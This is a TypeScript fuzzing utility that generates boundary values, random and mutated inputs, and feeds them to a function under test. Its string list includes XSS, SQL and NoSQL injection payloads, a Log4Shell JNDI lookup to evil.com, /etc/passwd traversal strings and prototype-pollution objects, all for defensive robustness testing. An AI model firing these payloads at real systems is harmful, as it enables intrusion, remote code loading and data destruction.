import { TestFailure } from '../types';

type PrimitiveType = 'string' | 'number' | 'boolean' | 'object' | 'array' | 'null' | 'undefined';

interface FuzzInput {
  value: unknown;
  type: PrimitiveType;
  label: string;
}

interface MutationResult {
  original: unknown;
  mutated: unknown;
  description: string;
}

export class Fuzzer {
  private rng: () => number;

  constructor(seed?: number) {
    let s = seed || Date.now();
    this.rng = () => {
      s = (s * 1103515245 + 12345) & 0x7fffffff;
      return s / 0x7fffffff;
    };
  }

  generateBoundaryValues(): FuzzInput[] {
    const inputs: FuzzInput[] = [
      { value: null, type: 'null', label: 'null' },
      { value: undefined, type: 'undefined', label: 'undefined' },
      { value: '', type: 'string', label: 'empty string' },
      { value: 0, type: 'number', label: 'zero' },
      { value: -0, type: 'number', label: 'negative zero' },
      { value: -1, type: 'number', label: 'negative one' },
      { value: 1, type: 'number', label: 'one' },
      { value: Number.MAX_SAFE_INTEGER, type: 'number', label: 'max safe integer' },
      { value: Number.MIN_SAFE_INTEGER, type: 'number', label: 'min safe integer' },
      { value: Number.MAX_VALUE, type: 'number', label: 'max value' },
      { value: Number.MIN_VALUE, type: 'number', label: 'min positive value' },
      { value: Infinity, type: 'number', label: 'infinity' },
      { value: -Infinity, type: 'number', label: 'negative infinity' },
      { value: NaN, type: 'number', label: 'NaN' },
      { value: [], type: 'array', label: 'empty array' },
      { value: {}, type: 'object', label: 'empty object' },
      { value: true, type: 'boolean', label: 'true' },
      { value: false, type: 'boolean', label: 'false' },
      { value: new Date(0), type: 'object', label: 'epoch date' },
      { value: new Date(NaN), type: 'object', label: 'invalid date' },
    ];
    return inputs;
  }

  generateStrings(count: number): string[] {
    const strings: string[] = [];

    strings.push('');
    strings.push('x');
    strings.push('A'.repeat(100));
    strings.push('A'.repeat(10000));

    strings.push('\x00');
    strings.push('\x00\x00\x00');

    strings.push('\n');
    strings.push('\r\n');
    strings.push('\t');
    strings.push('\\');

    strings.push('<script>alert(1)</script>');
    strings.push('<img src=x onerror=alert(1)>');
    strings.push('javascript:alert(1)');

    strings.push("' OR '1'='1");
    strings.push("' OR 1=1 --");
    strings.push('1; DROP TABLE users;');
    strings.push("admin'--");
    strings.push('${jndi:ldap://evil.com/a}');
    strings.push('../../../etc/passwd');
    strings.push('/etc/passwd\x00.html');

    strings.push(JSON.stringify({ $gt: '' }));
    strings.push(JSON.stringify({ $where: '1==1' }));

    for (let i = 0; i < count; i++) {
      strings.push(this.randomString(0, this.randomInt(0, 500)));
    }

    return strings;
  }

  generateNumbers(count: number): number[] {
    const numbers: number[] = [
      0, -0, 1, -1, 2, -2,
      Number.MAX_SAFE_INTEGER,
      Number.MIN_SAFE_INTEGER,
      Number.MAX_VALUE,
      Number.MIN_VALUE,
      Infinity,
      -Infinity,
      NaN,
      Number.EPSILON,
      0.1 + 0.2,
      1e-308,
      1e308,
      -1e308,
      Math.PI,
      Math.E,
    ];

    for (let i = 0; i < count; i++) {
      numbers.push(this.randomNumber());
    }

    return numbers;
  }

  generateObjects(count: number): Record<string, unknown>[] {
    const objects: Record<string, unknown>[] = [
      {},
      { '': '' },
      { __proto__: { isAdmin: true } },
      { constructor: 'malicious' },
      { prototype: { pollute: true } },
      { length: 0 },
      { length: -1 },
      { length: Number.MAX_SAFE_INTEGER },
    ];

    for (let i = 0; i < count; i++) {
      const obj: Record<string, unknown> = {};
      const keys = this.randomInt(1, 10);
      for (let j = 0; j < keys; j++) {
        obj[this.randomString(3, 10)] =
          this.rng() < 0.33
            ? this.randomString(0, 20)
            : this.rng() < 0.5
              ? this.randomNumber()
              : this.rng() < 0.5
                ? this.rng() > 0.5
                : [];
      }
      objects.push(obj);
    }

    return objects;
  }

  generateArrays(count: number): unknown[][] {
    const arrays: unknown[][] = [
      [],
      [undefined],
      [null],
      [0],
      [''],
      Array(1000).fill(0),
      Array(1000).fill(''),
    ];

    for (let i = 0; i < count; i++) {
      const arr: unknown[] = [];
      const len = this.randomInt(0, 20);
      for (let j = 0; j < len; j++) {
        arr.push(
          this.rng() < 0.25
            ? this.randomString(0, 10)
            : this.rng() < 0.5
              ? this.randomNumber()
              : this.rng() < 0.75
                ? this.rng() > 0.5
                : null,
        );
      }
      arrays.push(arr);
    }

    return arrays;
  }

  generateAll(perType: number = 20): FuzzInput[] {
    const inputs: FuzzInput[] = [];

    for (const v of this.generateBoundaryValues()) {
      inputs.push(v);
    }

    for (const s of this.generateStrings(perType)) {
      inputs.push({ value: s, type: 'string', label: `random string (${s.length} chars)` });
    }

    for (const n of this.generateNumbers(perType)) {
      inputs.push({ value: n, type: 'number', label: `number: ${n}` });
    }

    for (const o of this.generateObjects(perType)) {
      inputs.push({ value: o, type: 'object', label: `object with ${Object.keys(o).length} keys` });
    }

    for (const a of this.generateArrays(perType)) {
      inputs.push({ value: a, type: 'array', label: `array with ${(a as unknown[]).length} elements` });
    }

    for (const b of [true, false]) {
      inputs.push({ value: b, type: 'boolean', label: String(b) });
    }

    return inputs;
  }

  mutate(value: unknown, iterations: number = 5): MutationResult[] {
    const results: MutationResult[] = [];

    if (value === null || value === undefined) {
      const mutations = [0, '', false, [], {}];
      for (const m of mutations) {
        results.push({ original: value, mutated: m, description: `${String(value)} → ${typeof m}` });
      }
      return results;
    }

    for (let i = 0; i < iterations; i++) {
      let mutated: unknown;

      if (typeof value === 'string') {
        mutated = this.mutateString(value);
      } else if (typeof value === 'number') {
        mutated = this.mutateNumber(value);
      } else if (Array.isArray(value)) {
        mutated = this.mutateArray(value);
      } else if (typeof value === 'object') {
        mutated = this.mutateObject(value as Record<string, unknown>);
      } else {
        mutated = !value;
      }

      results.push({
        original: value,
        mutated,
        description: `${JSON.stringify(value).slice(0, 30)} → ${JSON.stringify(mutated).slice(0, 30)}`,
      });
    }

    return results;
  }

  private mutateString(value: string): string {
    const ops = [
      () => value + this.randomString(1, 10),
      () => value.slice(0, Math.floor(value.length / 2)),
      () => value + '\x00',
      () => value.toUpperCase(),
      () => value.toLowerCase(),
      () => value.replace(/a/g, '\x00'),
      () => '',
      () => 'A'.repeat(value.length * 2),
      () => value + '\nDROP TABLE',
      () => `${value}<script>`,
    ];
    return ops[this.randomInt(0, ops.length - 1)]();
  }

  private mutateNumber(value: number): number {
    const ops = [
      () => value + 1,
      () => value - 1,
      () => value * -1,
      () => 0,
      () => Infinity,
      () => -Infinity,
      () => NaN,
      () => value * 1000,
      () => value / 1000,
      () => Number.MAX_SAFE_INTEGER,
    ];
    return ops[this.randomInt(0, ops.length - 1)]();
  }

  private mutateArray(value: unknown[]): unknown[] {
    if (value.length === 0) return [null, undefined, 0, '', false];
    const arr = [...value];
    const idx = this.randomInt(0, arr.length);
    arr[idx] = null;
    return arr;
  }

  private mutateObject(value: Record<string, unknown>): Record<string, unknown> {
    const keys = Object.keys(value);
    if (keys.length === 0) return { __proto__: [] };
    const obj = { ...value };
    const idx = this.randomInt(0, keys.length);
    const key = keys[idx === keys.length ? 0 : idx];
    obj[key] = null;
    return obj;
  }

  testFunction(fn: (...args: unknown[]) => unknown, inputCount: number = 20): TestFailure[] {
    const failures: TestFailure[] = [];
    const inputs = this.generateAll(inputCount);

    for (const input of inputs) {
      try {
        fn(input.value);
      } catch (err) {
        failures.push({
          name: `fuzz_${input.label}`,
          error: err instanceof Error ? err.message : String(err),
          file: '',
          line: 0,
        });
      }
    }

    return failures;
  }

  coverageGuided(originalInputs: unknown[], fn: (...args: unknown[]) => unknown, rounds: number = 3): FuzzInput[] {
    const corpus: FuzzInput[] = originalInputs.map((v, i) => ({
      value: v,
      type: typeof v as PrimitiveType,
      label: `corpus_${i}`,
    }));

    const visited = new Set<string>();

    for (let round = 0; round < rounds; round++) {
      const newCorpus: FuzzInput[] = [];

      for (const item of corpus) {
        const hash = JSON.stringify(item.value);
        if (visited.has(hash)) continue;
        visited.add(hash);

        const mutations = this.mutate(item.value, 3);
        for (const m of mutations) {
          try {
            fn(m.mutated);
          } catch {
            // record failures
          }
          newCorpus.push({
            value: m.mutated,
            type: typeof m.mutated as PrimitiveType,
            label: `mut_${round}_${m.description}`,
          });
        }
      }

      corpus.push(...newCorpus);
    }

    return corpus;
  }

  private randomString(minLen: number, maxLen: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 \t\n\r!@#$%^&*()_+-=[]{}|;:,.<>?/~`';
    const len = this.randomInt(minLen, maxLen);
    let result = '';
    for (let i = 0; i < len; i++) {
      result += chars[this.randomInt(0, chars.length - 1)];
    }
    return result;
  }

  private randomInt(min: number, max: number): number {
    return Math.floor(this.rng() * (max - min + 1)) + min;
  }

  private randomNumber(): number {
    const scale = this.rng() < 0.5 ? 1 : this.rng() < 0.5 ? 1000 : 0.001;
    return (this.rng() - 0.5) * 2 * Number.MAX_SAFE_INTEGER * scale;
  }
}
